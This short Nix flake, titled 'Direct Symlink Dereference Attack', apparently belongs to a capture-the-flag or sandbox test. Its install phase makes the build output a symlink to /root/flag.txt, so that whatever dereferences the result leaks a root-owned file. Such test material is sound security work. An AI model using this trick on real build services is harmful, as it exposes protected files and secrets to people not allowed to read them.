{
  description = "Direct Symlink Dereference Attack";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }: 
  let
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "direct-symlink";
      version = "1.0";
      src = ./.;

      buildPhase = "true";

      installPhase = ''
        ln -s /root/flag.txt $out
      '';
    };
  };
}
